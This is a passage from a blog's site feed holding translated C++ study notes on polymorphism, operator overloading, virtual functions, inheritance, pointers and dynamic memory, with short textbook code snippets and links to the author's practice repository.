        <content type="html"><![CDATA[<h1 id="polymorphism-overview">Polymorphism Overview</h1><p>Polymorphism refers to different behaviors when the same message isreceived by different types of objects. A message refers to<strong>calls to class member functions</strong>, and differentbehaviors refer to different implementations, which is <strong>callingdifferent functions</strong>.</p><p>The simplest example is the <strong>“+”</strong> operator, which canimplement addition between integers, floating-point numbers, anddouble-precision floating-point numbers, including mixed-type addition.The same “+” message, when received by different types of objects, usesdifferent methods for addition operations. This is polymorphism.</p><h2 id="types-of-polymorphism">Types of Polymorphism</h2><p>Object-oriented polymorphism can be divided into four categories:</p><ul><li>Overloading Polymorphism</li><li>Coercion Polymorphism</li><li>Inclusion Polymorphism</li><li>Parametric Polymorphism</li></ul><p>The first two are called <strong>ad-hoc polymorphism</strong>, andthe latter two are called <strong>universal polymorphism</strong>.</p><ol type="1"><li>Overloading polymorphism refers to the overloading of ordinaryfunctions and class member functions learned before, and of courseincludes <strong>operator overloading</strong>.</li><li>Coercion polymorphism, simply put, is when <strong>+</strong>involves mixed types, it will perform type coercion, which is aninstance of coercion polymorphism.</li><li>Inclusion polymorphism mainly refers to the polymorphic behavior ofmember functions with the same name defined in different classes in aclass hierarchy, implemented through <strong>virtualfunctions</strong>.</li><li>Parametric polymorphism is associated with class templates and mustbe given actual types when used to be instantiated.</li></ol><p>This article will introduce operator overloading and virtualfunctions.</p><h2 id="implementation-of-polymorphism">Implementation ofPolymorphism</h2><p>Polymorphism can be divided into two categories from animplementation perspective: <strong>compile-time polymorphism andruntime polymorphism</strong>. The former, as the name suggests,determines the specific operation object of the same-named operationduring compilation. This process of determining the specific object ofan operation is called <strong>binding</strong>.</p><p>Binding refers to the process of associating computer programs witheach other, the process of <strong>connecting an identifier with astorage address</strong>. In object-oriented terms, it is the process ofcombining a message with an object’s method.</p><p>Binding is also divided into two types: <strong>staticbinding</strong> and <strong>dynamic binding</strong>.</p><p>When binding is completed during the compilation and linking phase,it is called <strong>static binding</strong>. Also known as earlybinding.</p><p>With static binding, <strong>dynamic binding</strong>, as the namesuggests, is binding completed during program execution. Also known aslate binding. It corresponds to runtime polymorphism.</p><h1 id="operator-overloading">Operator Overloading</h1><p>Operator overloading is giving multiple meanings to existingoperators, where the same operator causes different behaviors whenacting on different types of data.</p><h2 id="rules-for-operator-overloading">Rules for OperatorOverloading</h2><ol type="1"><li>In C++, except for a few operators, all operators can be overloaded,and <strong>only existing operators can be overloaded</strong>.</li><li>After overloading, the precedence and associativity of operatorswill not change.</li><li>Operators are appropriately modified for the actual needs of newtype data. The overloaded functionality should be similar to theoriginal functionality, cannot change the number of operands, and atleast one must be a custom type (otherwise it’s not calledoverloading).</li></ol><div class="note danger flat"><p>Several operators that cannot be overloaded: class membershipoperator <strong>“.”</strong>, member function pointer operator “.*“,scope resolution operator”::“, and ternary operator”?:”</p></div><hr /><p>There are two forms of overloading: <strong>overloading as non-staticmember functions of a class</strong> and <strong>overloading asnon-member functions</strong>.</p><p>General form for overloading as non-static member functions andnon-member functions of a class:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">返回类型 <span class="keyword">operator</span> 运算符(形参表)</span><br><span class="line">&#123;</span><br><span class="line">  函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>When overloading as a non-member function, sometimes you need toaccess members in the class, in which case it can be declared as afriend function.</p></div><p><strong>Note</strong>:</p><p>When an operator is overloaded as a member function of a class, thenumber of function parameters is one less than the original number ofoperands (except for postfix “++” and “–”); when overloaded as anon-member function, the number of parameters equals the number oforiginal operands. The reason is that when overloaded as a memberfunction of a class, the first operand becomes the target object of thefunction call, so it doesn’t need to appear in the parameter list, andthe function body can directly access the members of the first operand.When overloaded as a non-member function, all operands of the operatormust be explicitly passed through parameters.</p><h2 id="operator-overloading-as-member-functions">Operator Overloadingas Member Functions</h2><p>Mainly the difference between unary and binary operators.</p><p>For binary operators, the data type of the preceding class should bea member function of that class, and the data type of the followingclass should be placed in the formal parameters.</p><p>Unary operators are divided into two types: <strong>prefix unaryoperators</strong> and <strong>postfix unary operators</strong>. (++, –are unary operators, different names depending on placement)</p><ul><li><p>For prefix unary operators, the overloaded member function has noformal parameters;</p></li><li><p>For postfix unary operators, the function must have an int formalparameter. This int parameter serves no purpose in the operation, it’sonly used to distinguish between prefix and postfix.</p></li></ul><h2 id="operator-overloading-as-non-member-functions">OperatorOverloading as Non-Member Functions</h2><p>For binary operators, of the two data types before and after, onlyone needs to be a custom data type to enable operator overloading, andboth data types need to be function formal parameters.</p><p>For prefix unary operators, the formal parameter is the data typebeing operated on.</p><p>For postfix unary operators, there are two formal parameters: one isthe data type being operated on, and the other is an int data type.</p><div class="note success flat"><p>It’s not hard to see that the main difference between memberfunctions and non-member functions is that member functions implicitlytreat the previous operand as the object of the function call, whilenon-member functions do not.</p></div><hr /><p>This section uses a Complex (complex number class) to illustrate</p><p><ahref="https://raw.githubusercontent.com/hustlixiang21/cpp-practice/main/%E5%AE%9D%E8%B4%9D%E6%96%87%E4%BB%B6/3.4.bmp">Clickto view problem image</a> (CUG experiment problem)</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/Complex/main.cpp">Sourcecode on github</a></p><h1 id="virtual-functions">Virtual Functions</h1><p>Virtual functions are the foundation of dynamic binding. Virtualfunctions must be non-static member functions. After virtual functionsare derived, polymorphism during runtime can be implemented in the classhierarchy.</p><h2 id="general-virtual-function-members">General Virtual FunctionMembers</h2><p>Declaration syntax</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">virtual</span> 函数类型 函数名(形参表)；</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>Virtual function declarations can only appear in function prototypedeclarations in class definitions, not in member functionimplementations.</p></div><p>Conditions required for polymorphism during runtime:</p><pre><code>1. Assignment compatibility rules1. Declare virtual functions1. Call through member functions or access virtual functions through pointers or references</code></pre><p>If the derived class does not explicitly declare virtual functions,the system will follow these rules to determine whether a functionmember in the derived class is a virtual function:</p><ol type="1"><li>Whether the function has the same name as the base class virtualfunction.</li><li>Whether the function has the same number of parameters andcorresponding parameter types as the base class virtual function.</li><li>Whether the function has the same return type as the base classvirtual function or satisfies assignment compatibility rules for pointerand reference type return values.</li></ol><p>If the above conditions are met, the virtual function in the derivedclass will <strong>override</strong> all functions with the same name inthe base class, which is scope hiding. Of course, it can also bedistinguished through the scope resolution operator “::”.</p><p>It should be emphasized that dynamic binding only occurs when virtualfunctions are called through base class pointers or references.</p><div class="note success flat"><p>Actually, it doesn’t matter whether you add the virtual keywordbefore virtual functions in derived classes, but it’s recommended to addit to make it clearer that they are virtual functions.</p></div><p><strong>Object slicing</strong> refers to using an instance of aderived class to initialize a base class object, which calls the baseclass copy constructor. That is, only the data members of the derivedclass that are the same as the base class will be copied, and the restwill be ignored. At this point, this base class object has norelationship with the derived class object, which is very consistentwith type compatibility rules.</p><h2 id="virtual-destructors">Virtual Destructors</h2><p>Virtual constructors cannot be declared, but virtual destructors canbe declared. The syntax is to add a virtual keyword before the normaldestructor.</p><p>So when do you need to use virtual destructors?</p><p>When a base class pointer points to a derived class object, if<code>delete(base class pointer)</code> is performed at this time, itwill call the base class destructor instead of the derived classdestructor, causing memory leaks. (I actually think this situation isalmost never encountered, just understand it) The difference frompolymorphism of ordinary member functions is not much.</p><h1 id="pure-virtual-functions-and-abstract-classes">Pure VirtualFunctions and Abstract Classes</h1><h2 id="pure-virtual-functions">Pure Virtual Functions</h2><p>Pure virtual functions are virtual functions declared in the baseclass that have no definition in the base class but require any derivedclass to define its own implementation. The method to implement purevirtual functions in the base class is to add “=0” after the functionprototype, for example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span></span><br></pre></td></tr></table></figure><p>My big question is why introduce pure virtual functions?</p><ol type="1"><li>To facilitate the use of polymorphism features, we often need todefine virtual functions in the base class.</li><li>In many cases, it is unreasonable for the base class itself togenerate objects.</li></ol><p>For example, animals as a base class can derive subclasses liketigers and peacocks, but animals themselves generating objects isobviously unreasonable.</p><p>To solve the above problems, the concept of pure virtual functionswas introduced. When a function is defined as a pure virtual function,the compiler requires that it must be overridden in derived classes toachieve polymorphism. Classes containing pure virtual functions arecalled abstract classes and cannot generate objects. This solves theabove two problems well. Classes that declare pure virtual functions areabstract classes. Therefore, <strong>users cannot create instances ofabstract classes</strong>, only instances of their derived classes(which implement the definitions of pure virtual functions in the baseclass). The most significant feature of pure virtual functions is: they<strong>must redeclare the function in inherited classes</strong>(without the =0 at the end, otherwise the derived class cannot beinstantiated), and they <strong>often have no definition in abstractclasses</strong>. The purpose of defining pure virtual functions is to<strong>make derived classes only inherit the functioninterface</strong>. The meaning of pure virtual functions is to allowall class objects (mainly derived class objects) to execute the actionsof pure virtual functions, but the class cannot provide a reasonabledefault implementation for pure virtual functions. So the declaration ofpure virtual functions in a class is telling the designer of thesubclass, “You must provide an implementation of the pure virtualfunction, but I don’t know how you will implement it.”</p><h2 id="abstract-classes">Abstract Classes</h2><p>Very simple, classes with pure virtual functions are abstract classesand <strong>cannot be instantiated</strong></p><p>If you want to learn more, <ahref="https://blog.csdn.net/LY_ysys629/article/details/76904129">see theblog</a>.</p><h1id="program-example---variable-step-size-trapezoidal-integration-algorithm-for-solving-function-definite-integrals">ProgramExample - Variable Step Size Trapezoidal Integration Algorithm forSolving Function Definite Integrals</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/%E5%8F%98%E6%AD%A5%E9%95%BF%E6%A2%AF%E5%BD%A2%E7%A7%AF%E5%88%86%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9A%E7%A7%AF%E5%88%86.cpp">Seegithub</a></p><h1id="comprehensive-example---improvement-of-personal-bank-account-management-program">ComprehensiveExample - Improvement of Personal Bank Account Management Program</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_2">Seegithub</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP Inheritance and Derivation</title>
      <link href="/2022/07/31/CPP/CPP%20Inheritance%20and%20Derivation/"/>
      <url>/2022/07/31/CPP/CPP%20Inheritance%20and%20Derivation/</url>
      
        <content type="html"><![CDATA[<h1 id="class-inheritance-and-derivation">Class Inheritance andDerivation</h1><h2 id="overview">Overview</h2><p>Inheritance means obtaining <strong>attributes</strong> and<strong>behavioral characteristics</strong> from ancestors.</p><p>Class inheritance is when a new class obtains existingcharacteristics from an existing class. From another perspective, theprocess of creating a new class from an existing class is called classderivation.</p><div class="note info flat"><p>They are essentially the same, just the same process viewed fromdifferent angles.</p></div><h3 id="purpose-of-inheritance-and-derivation">Purpose of Inheritanceand Derivation</h3><p>Purpose of inheritance: Achieve reuse of design and code.</p><p>Purpose of derivation: When new problems arise and the originalprogram cannot solve them well, the original program needs to bemodified.</p><hr /><blockquote><p>Different classification standards</p><blockquote><p>Base classes that directly participate in deriving a class are called<strong>direct base classes</strong>, and base classes of base classesor even higher-level base classes are called <strong>indirect baseclasses</strong>.</p></blockquote><blockquote><p>A derived class can have multiple base classes at the same time, thissituation is called <strong>multiple inheritance</strong>. Similarly,the case with only one base class is called <strong>singleinheritance</strong>.</p></blockquote></blockquote><h2 id="definition-of-derived-classes">Definition of DerivedClasses</h2><p>Derived class definition syntax:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>: inheritance_mode BaseClassName1,...,inheritance_mode BaseClassNamen</span><br><span class="line">&#123;</span><br><span class="line">  member declarations</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="process-of-creating-derived-classes">Process of Creating DerivedClasses</h2><ol type="1"><li>Absorb base class members</li></ol><p>​ After absorbing base class members, the derived class actuallycontains all members from its base classes <strong>except constructorsand destructors</strong>.</p><ol start="2" type="1"><li>Modify base class members</li></ol><p>​ If a derived class declares a new member with the same name as abase class member, the derived new member <strong>hides oroverrides</strong> the outer member with the same name.</p><ol start="3" type="1"><li>Add new members</li></ol><p>​ Derived classes add new members to develop functionality.</p><h1 id="access-control">Access Control</h1><p>Access mainly comes from two aspects: first, new members in derivedclasses accessing members inherited from base classes; second, outsidethe derived class, accessing members inherited from base classes throughderived class objects.</p><p>Inheritance modes are mainly divided into <strong>threetypes</strong>, and their respective characteristics are listedbelow.</p><h2 id="public-inheritance-public">Public Inheritance (public)</h2><ul><li><p>The access attributes of public and protected members of the baseclass <strong>remain unchanged</strong> in the derived class, butprivate members of the base class <strong>cannot be directlyaccessed</strong>.</p></li><li><p>Member functions in derived classes can directly access publicand protected members of the base class, but <strong>cannot directlyaccess</strong> private members of the base class.</p></li><li><p>When accessing members inherited from the base class throughderived class objects, <strong>only public members can beaccessed</strong>.</p></li></ul><h2 id="protected-inheritance-protected">Protected Inheritance(protected)</h2><ul><li><p>Both public and protected members of the base class appear in thederived class <strong>as protected</strong>, but private members of thebase class <strong>cannot be directly accessed</strong>.</p></li><li><p>Member functions in derived classes can directly access publicand protected members of the base class, but cannot directly accessprivate members of the base class.</p></li><li><p>Through derived class objects, <strong>no members inherited fromthe base class can be directly accessed</strong>.</p></li></ul><h2 id="private-inheritance-private">Private Inheritance (private)</h2><ul><li><p>Both public and protected members of the base class appear in thederived class <strong>as private</strong>, but private members of thebase class <strong>cannot be directly accessed</strong>.</p></li><li><p>Member functions in derived classes <strong>can directlyaccess</strong> public and protected members of the base class, but<strong>cannot directly access</strong> private members of the baseclass.</p></li><li><p>Through derived class objects, <strong>no members inherited fromthe base class can be directly accessed</strong>.</p></li></ul><div class="note success flat"><p>It is not difficult to see that the second point of these threeinheritance methods is exactly the same, which follows the principle ofdata sharing and protection. Derived class objects can access publicmembers under public inheritance, but cannot access them in other casesfor data protection.</p></div><p><a href="https://www.cnblogs.com/NueXini/p/16180257.html">Attached isa good detailed explanation</a></p><h1 id="type-compatibility-rules">Type Compatibility Rules</h1><p>Type compatibility rules mean that anywhere a base class object isneeded, <strong>public derived class objects</strong> can be used assubstitutes. Through public inheritance, derived classes get all membersof the base class except constructors and destructors, possessing allfunctionality of the base class. (Protected and private inheritancedon’t work because objects cannot access any members inherited from thebase class)</p><p>Example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;...&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>: <span class="keyword">public</span> B &#123;...&#125;</span><br><span class="line"></span><br><span class="line">B b1, * pb1;</span><br><span class="line">D d1;</span><br></pre></td></tr></table></figure><p>Based on the above code, there are three substitution situations:</p><ul><li><p>Derived class objects can be implicitly converted to base classobjects</p><p><code>b1=d1;</code></p></li><li><p>Derived class objects can initialize base class references</p><p><code>B &amp;rb=d1;</code></p></li><li><p>Derived class pointers can be implicitly converted to base classpointers</p><p><code>pb1=&amp;d1</code></p></li></ul><p>This compatibility rule allows us to use the same function touniformly handle base class and public derived class objects. That is,when the formal parameter is a base class object (reference, pointer),the actual parameter can be a derived class object or pointer. Thisgreatly improves program efficiency.</p><h1 id="constructors-and-destructors-of-derived-classes">Constructorsand Destructors of Derived Classes</h1><p>Constructors of derived classes are only responsible for initializingnewly added members of the derived class. For all members inherited fromthe base class, initialization is still done by the base classconstructor. Finally, cleanup of derived objects also requires addingnew destructors.</p><h2 id="constructors">Constructors</h2><p>Since derived classes cannot access many data members in the baseclass, they need to rely on the base class constructor. Whenconstructing derived class objects, the base class constructor is calledfirst, then the newly added member objects of the derived class areinitialized.</p><p>General syntax form:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DerivedClassName::<span class="built_in">DerivedClassName</span>(parameter_list):<span class="built_in">BaseClassName1</span>(BaseClassName1_initialization_parameters),...,<span class="built_in">BaseClassNamen</span>(BaseClassNamen_initialization_parameters)</span><br><span class="line">,<span class="built_in">member_object_name1</span>(member_object1_initialization_parameters),...,<span class="built_in">member_object_namem</span>(member_objectm_initialization_parameters)</span><br><span class="line">&#123;</span><br><span class="line">  other initialization operations of derived <span class="keyword">class</span> <span class="title class_">constructor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>General order of constructor execution:</p><ol type="1"><li>Call base class constructors in the order they were declared duringinheritance (left to right).</li><li>Initialize newly added member objects of the derived class in theorder they were declared in the class.</li><li>Execute the content in the derived class constructor body.</li></ol><h2 id="copy-constructor">Copy Constructor</h2><p>Derived classes also use the base class copy constructor whenperforming copy construction.</p><p>Example: If writing a copy constructor for the Derived class (withBase class as base class), the form is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Derived::<span class="built_in">Derived</span>(<span class="type">const</span> Derived &amp;v): <span class="built_in">Base</span>(v)&#123;...&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>Here the base class uses a reference to the derived class, whichfully complies with the type compatibility rules where derived classobjects can be used to initialize the base class.</p></div><h2 id="destructor">Destructor</h2><p>Actually, it’s completely consistent with the idea of constructors,the biggest difference is that <strong>the order of destruction iscompletely opposite to the order of initialization.</strong></p><hr /><h1id="identification-and-access-of-derived-class-members">Identificationand Access of Derived Class Members</h1><h2 id="scope-resolution-operator">Scope Resolution Operator</h2><p>“::” is the scope resolution operator, used to specify the name ofthe class where the member to be accessed is located.</p><p>If a derived class declares a new function with the same name as abase class member function, even if the function parameter lists aredifferent, all overloaded forms of the inherited function with the samename from the base class will be hidden.</p><p>The same applies to data members. New members with the same name willoverride the base class; if multiple inheritance base classes areduplicated, ambiguity will arise and must be resolved by using classnames and scope resolution operators to identify members.</p><div class="note danger flat"><p>Only functions defined in the same scope are called overloads.</p></div><hr /><p>The using keyword can be used to use identifiers from otherscopes.</p><h2 id="virtual-base-classes">Virtual Base Classes</h2><p>Suppose a derived class inherits from multiple base classes, and someor all of these base classes are derived from <strong>another commonbase class</strong>, then in this derived class, there will be the samenames and <strong>multiple copies</strong> in memory, causing programoverhead.</p><p>At this time, the common base class can be set as a virtual baseclass, so that data members with the same name inherited from differentpaths have only one copy in memory, and the same function name has onlyone mapping.</p><p>Syntax form:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>:<span class="keyword">virtual</span> inheritance_mode BaseClassName</span><br></pre></td></tr></table></figure><h2id="constructors-of-virtual-base-classes-and-their-derived-classes">Constructorsof Virtual Base Classes and Their Derived Classes</h2><p>In the entire inheritance relationship, all derived classes thatdirectly or indirectly inherit from virtual base classes must listinitialization of virtual base classes in the member initialization listof constructors.</p><p>When calling the constructor of virtual classes, the C++ compilerwill specify the constructor of the most derived class to call theconstructor of the virtual base class, so there’s no need to worry aboutmultiple repeated calls.</p><blockquote><p>The general order of constructing an object of a class is:</p><ol type="1"><li><p>If the class has direct or indirect virtual base classes, thenthe constructor of the virtual base class is executed first.</p></li><li><p>If there are other base classes, initialize them in the orderthey appear in the inheritance declaration list, but duringconstruction, their virtual base class constructors are no longerexecuted.</p></li><li><p>Initialize newly added member objects in the order they appear inthe definition. For class-type member objects, if they appear in theconstructor initialization list, execute the constructor with thespecified parameters; if not, execute the default constructor; forbasic-type member objects, if they appear in the initialization list,use the specified value to assign initial value, otherwise donothing.</p></li><li><p>Execute the constructor function body.</p></li></ol></blockquote><h1id="program-example---solving-linear-equations-using-gaussian-elimination">ProgramExample - Solving Linear Equations Using Gaussian Elimination</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Gauss%E6%B6%88%E5%8E%BB_CPP">Sourcecode on github</a></p><h1id="comprehensive-example---personal-bank-account-management-program">ComprehensiveExample - Personal Bank Account Management Program</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_1">Sourcecode on github</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Arrays, Pointers and Strings</title>
      <link href="/2022/07/23/CPP/C++%20Arrays,%20Pointers%20and%20Strings/"/>
      <url>/2022/07/23/CPP/C++%20Arrays,%20Pointers%20and%20Strings/</url>
      
        <content type="html"><![CDATA[<h1 id="arrays">Arrays</h1><p>An array is a collection of objects with a certain sequentialrelationship, and the objects that make up the array become elements ofthat array. An array name is a pointer that cannot be assigned, called apointer constant.</p><blockquote><p>Two-dimensional arrays in C++ are treated as <strong>arrays ofone-dimensional arrays</strong>. Therefore, two-dimensional arrays arestored in <strong>row-major</strong> order.</p></blockquote><hr /><blockquote><p>When passing arrays as parameters, the size of the first dimension isgenerally not specified, and even if specified, it will be ignored.</p></blockquote><h2 id="program-examplelinear-fitting">Program Example—LinearFitting</h2><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Linear%20fit">Viewsource code</a></p><hr /><h1 id="pointers">Pointers</h1><p>Basic definitions and usage are omitted.</p><h2 id="use-of-void-pointers">Use of void Pointers</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">void</span> voidObject;             <span class="comment">//Cannot declare variables of void type</span></span><br><span class="line">  <span class="type">void</span> *pv;                    <span class="comment">//Can declare pointers of void type</span></span><br><span class="line">  <span class="type">int</span> i = <span class="number">5</span>;</span><br><span class="line">  pv = &amp;i;</span><br><span class="line">  <span class="type">int</span> *pint = <span class="built_in">static_cast</span>&lt;<span class="type">int</span> *&gt;(pv);</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;* pint=&quot;</span> &lt;&lt; * pint &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Running result:</span><br><span class="line">  * pint = <span class="number">5</span></span><br></pre></td></tr></table></figure><div class="note info flat"><p>Void pointers are generally only used when the data type pointed toby the pointer is uncertain.</p></div><h2 id="use-of-null-pointers">Use of Null Pointers</h2><p>Arithmetic operations between different types of pointers or betweenpointers and non-zero integers are <strong>meaningless</strong>, butpointer variables can be compared with integer 0. 0 is specifically usedto represent a null pointer, which is a pointer that does not point toany valid address.</p><p>Null pointers can also be represented using NULL.</p><div class="note success flat"><p>NULL is a macro defined in many header files, defined as 0.</p></div><h2 id="object-pointers">Object Pointers</h2><p>As the name suggests, pointers that point to objects.</p><p>When using object pointers, object members can be represented veryintuitively. The syntax form is<code>object_pointer_name-&gt;member_name</code>, which is equivalent toaccessing <code>(*object_pointer_name).member_name</code>.</p><p>Earlier in class composition, there was a concept called forwardreference declaration, where two classes referenced each other duringdefinition. This problem can be solved using pointers.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>;         <span class="comment">//Forward reference declaration</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">  A *x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  B *y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Declaring a pointer instead of an object is allowed. Once A isdefined, A objects can be declared.</p><h3 id="this-pointer">this Pointer</h3><p>The this pointer is a special pointer implicitly present in everynon-static member function of a class (including constructors anddestructors), used to point to the object being <strong>operated on bythe member function</strong></p><div class="note info flat"><p>The this pointer is an implicit parameter of member functions,allowing the function to know which object it’s operating on, thusaccessing its data members. For constant member functions, this implicitparameter is of constant pointer type.</p></div><h3 id="pointers-to-non-static-members-of-classes">Pointers toNon-static Members of Classes</h3><p>Declaration statements:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type_specifier class_name::* pointer_name                           <span class="comment">//Declare pointer to data member</span></span><br><span class="line"><span class="built_in">type_specifier</span> (class_name::* pointer_name)(parameter_list);        <span class="comment">//Declare pointer to function member</span></span><br></pre></td></tr></table></figure><p>The general syntax for assigning values to pointers to data membersis:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pointer_name = &amp;class_name::data_member_name;</span><br></pre></td></tr></table></figure><p>When accessing data members, you can use:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">object_name.*class_member_pointer_name</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">object_pointer_name -&gt; *class_member_pointer_name</span><br></pre></td></tr></table></figure><p>The general syntax for assigning values to pointers to memberfunctions is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pointer_name = &amp;class_name::function_member_name;</span><br></pre></td></tr></table></figure><h3 id="pointers-to-static-members-of-classes">Pointers to StaticMembers of Classes</h3><p>Only ordinary pointers need to be used:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type_specifier  *pointer_name = &amp;class_name::static_data_member</span><br><span class="line"><span class="built_in">type_specifier</span> (*pointer_name)(formal_parameters) = &amp;class_name::static_member_function</span><br></pre></td></tr></table></figure><h1 id="dynamic-memory-allocation">Dynamic Memory Allocation</h1><p>In C++ programs, two operators are used to create and delete heapobjects (storage units applied for and released during programexecution): <code>new</code> and <code>delete</code>.</p><div class="note danger flat"><p>Where there’s new, there must be delete for release, otherwise itleads to inability to reclaim memory, causing the program to occupyincreasingly more memory, called memory leakage.</p></div><h2 id="creating-an-object-of-a-class">Creating an Object of aClass</h2><blockquote><p>Details to note when new creates an object of a class.</p><blockquote><p>If the class has a user-defined default constructor, then <code>newT</code> and <code>new T()</code> have no difference.</p></blockquote><blockquote><p>If the class does not define a default constructor, using <code>newT</code> will call the system-generated implicit default constructor;using <code>new T()</code> will, in addition to executing this implicitfunction, also initialize members of basic data types and pointer typeswith 0, and this process is <strong>recursive</strong>.</p></blockquote></blockquote><h2 id="creating-multi-dimensional-arrays">Creating Multi-dimensionalArrays</h2><p>The form is as follows:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> type_name T[array_first_dimension_length][array_second_dimension_length]...;</span><br></pre></td></tr></table></figure><p>Where the first dimension length of the array can be any<strong>expression</strong> that results in a positive integer, whilethe lengths of other array dimensions must be <strong>constantexpressions</strong> that result in positive integers.</p><p>Incorrect example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> * fp;</span><br><span class="line">fp = <span class="keyword">new</span> <span class="type">float</span>[<span class="number">10</span>][<span class="number">25</span>][<span class="number">10</span>]</span><br></pre></td></tr></table></figure><p><div class="note danger flat"><p>Here the new operation produces a pointer to a<code>$25 \times 10$</code> two-dimensional float type array, while fpis a pointer to float type data, creating a contradiction!</p></div></p><h1 id="creating-array-objects-with-vector">Creating Array Objects withvector</h1><p>C++ provides a packaged dynamic array—vector, with various types.vector is <strong>not a class</strong>, but <strong>a classtemplate</strong>.</p><p>The form for defining dynamic arrays using vector is:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;element_type&gt; <span class="title">array_object_name</span><span class="params">(array_length)</span></span>;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>All elements of array objects defined by vector will be initialized.If they are basic data types, all elements will be initialized with 0;if they are class types, the class’s default constructor will be calledfor initialization. So it’s necessary to ensure that classes used asarray elements <strong>need to have default constructors</strong>.Initial values can be specified, but <strong>all element initial valuesmust be the same</strong>.</p></div><h1 id="reference-related-supplements">Reference 